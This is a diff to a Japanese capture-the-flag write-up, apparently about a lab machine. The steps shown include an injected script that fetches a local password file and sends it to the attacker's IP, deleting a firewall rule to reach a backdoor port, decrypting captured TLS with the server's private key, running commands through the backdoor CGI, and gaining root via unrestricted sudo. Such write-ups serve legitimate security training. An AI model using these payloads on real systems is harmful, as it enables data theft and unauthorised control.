@@ -102,7 +102,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 リクエストが来たが、Cookie は取れなかった。
 
-SSRF で/dev/pass.txt をリクエストさせ、それを送信させる。
+SSRF で/dev/pass.txt をリクエストさせ、さらにそれを攻撃マシンに送信させる。
 
 ```js
 <script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://10.13.85.243:8000/"+encodeURIComponent(t), {mode:"no-cors"}))</script>
@@ -202,7 +202,7 @@ tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      
 
 41312 ポートがバックドアになっていて、現状は iptables の設定でブロックされているとのこと。
 
-ルールを削除。
+バックドアを使いたいので、ルールを削除。
 
 ```sh
 jack@ubuntu:/opt$ sudo iptables -D INPUT -p tcp --dport 41312 -j DROP
@@ -214,31 +214,126 @@ nc で接続はできるが、反応が無い状態。pcap を解析する必要
 $ nc 10.10.206.200 41312
 ```
 
-続きはまた後日
+capture.pcap を見て、TLS で暗号化されていることだけわかった。
+
+```sh
+# Verification error: certificate has expired ignore
+$ openssl s_client -connect 10.10.7.14:41312
+
+# Verification error: self-signed certificate
+$ openssl s_client -no_check_time -connect 10.10.7.14:41312
+
+# 証明書の部分をファイル保存。Verify成功。
+# 適当に入力すると、HTTP応答（Bad Request）が返された。
+$ openssl s_client -no_check_time -connect 10.10.7.14:41312 -CAfile ./CA
+
+...
+
+a
+HTTP/1.1 400 Bad Request
+Date: Tue, 10 Jun 2025 07:41:41 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 308
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at www.example.com Port 443</address>
+</body></html>
+closed
+```
+
+Firefox で接続しても BadRequest が返っており使い方は不明、パケットキャプチャを解析するにはサーバー側の秘密鍵が必要。
+
+```sh
+jack@ubuntu:~$ cd /etc/apache2/certs
+jack@ubuntu:/etc/apache2/certs$ ls -al
+total 16
+drwxr-xr-x 2 root root 4096 Mar 14  2023 .
+drwxr-xr-x 9 root root 4096 Aug 16  2023 ..
+-rw-r--r-- 1 root root 2025 Feb 26  2022 apache-certificate.crt
+-rw-r--r-- 1 root root 3272 Feb 26  2022 apache.key
+```
+
+秘密鍵があった。これを Wireshark に設定する。
+
+1. Edit - Preferences - Protocol - TLS - RSA key lists
+2. IP:10.133.71.33
+3. Port:41312
+4. Protocol:tcp
+5. Key File: apache.key
+
+HTTP リクエストが見えて、コマンド実行の方法が分かった。
+
+```http
+GET /cgi-bin/[REDACTED].py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-al HTTP/1.1
+Host: 10.0.2.15:41312
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Aug 2023 14:35:55 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 122
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+
+<h2>total 12
+drwxr-xr-x  2 root root 4096 Aug 16 14:29 .
+drwxr-xr-x 91 root root 4096 Mar 14 05:40 ..
+-rwxr-xr-x  1 root root  456 Aug 16 14:20 5UP3r53Cr37.py
+<h2>
+```
+
+権限は h4ck3d グループ。
+
+```sh
+id
+uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
+```
+
+無制限 sudo が付いているのでなんでもできる。
+
+```sh
+sudo -l
+Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu: (ALL : ALL) NOPASSWD: ALL
+```
+
+/root ディレクトリ
+
+```sh
+sudo ls -al /root
+total 56 drwx------ 7 root root 4096 Jan 29 2024 . drwxr-xr-x 19 root root 4096 Mar 14 2023 .. lrwxrwxrwx 1 root root 9 Mar 14 2023 .bash_history -> /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc -rw-r--r-- 1 root root 172 Mar 15 2023 bot.py drwx------ 3 root root 4096 Aug 16 2023 .cache drwx------ 3 root root 4096 Aug 17 2023 .config -rw------- 1 root root 33 Jan 29 2024 .lesshst drwxr-xr-x 3 root root 4096 Mar 14 2023 .local lrwxrwxrwx 1 root root 9 Mar 14 2023 .mysql_history -> /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -r-------- 1 root root 33 Mar 14 2023 root.txt -rw-r--r-- 1 root root 66 Jan 29 2024 .selected_editor drwx------ 5 root root 4096 Mar 14 2023 snap drwx------ 2 root root 4096 Mar 14 2023 .ssh -rwxr-xr-x 1 root root 82 Jan 29 2024 ssh.sh
+```
+
+ルートフラグ
+
+```sh
+sudo cat /root/root.txt
+```
 
 ## 振り返り
 
-- SSRF で、`http://127.0.0.1/dir/pass.txt` は成功するが、`http://localhost/dir/pass.txt` では機能しなかった。それに気付かず時間がかかった。
--
-
-## シェル安定化メモ
-
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-
-```
+- SSRF で、`http://127.0.0.1/dir/pass.txt` は成功するが、`http://localhost/dir/pass.txt` では機能しなかった。そこに気付かず時間がかかった。
+- /etc/apache2/certs に HTTPS サーバー秘密鍵があるのは勉強になった。
